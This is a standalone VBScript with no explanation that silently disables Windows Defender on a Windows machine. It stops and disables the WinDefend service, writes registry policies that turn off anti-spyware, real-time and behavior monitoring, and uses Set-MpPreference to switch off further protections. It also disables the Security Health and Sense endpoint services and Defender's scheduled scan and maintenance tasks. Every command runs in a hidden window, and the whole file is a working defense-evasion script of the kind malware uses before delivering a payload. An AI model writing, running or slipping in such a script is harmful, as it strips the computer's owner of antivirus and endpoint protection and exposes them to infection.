Set objShell = CreateObject("WScript.Shell")

objShell.Run "sc config WinDefend start= disabled", 0, True
objShell.Run "sc stop WinDefend", 0, True

objShell.Run "reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d 1 /f", 0, True
objShell.Run "reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d 1 /f", 0, True
objShell.Run "reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableBehaviorMonitoring"" /t REG_DWORD /d 1 /f", 0, True
objShell.Run "reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableScanOnRealtimeEnable"" /t REG_DWORD /d 1 /f", 0, True

objShell.Run "powershell -Command ""Set-MpPreference -DisableRealtimeMonitoring $true""", 0, True
objShell.Run "powershell -Command ""Set-MpPreference -DisableBehaviorMonitoring $true""", 0, True
objShell.Run "powershell -Command ""Set-MpPreference -DisableIOAVProtection $true""", 0, True
objShell.Run "powershell -Command ""Set-MpPreference -DisablePrivacyMode $true""", 0, True

objShell.Run "reg add ""HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService"" /v ""Start"" /t REG_DWORD /d 4 /f", 0, True
objShell.Run "reg add ""HKLM\SYSTEM\CurrentControlSet\Services\Sense"" /v ""Start"" /t REG_DWORD /d 4 /f", 0, True

objShell.Run "schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance"" /Disable", 0, True
objShell.Run "schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Cleanup"" /Disable", 0, True
objShell.Run "schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan"" /Disable", 0, True
objShell.Run "schtasks /Change /TN ""Microsoft\Windows\Windows Defender\Windows Defender Verification"" /Disable", 0, True
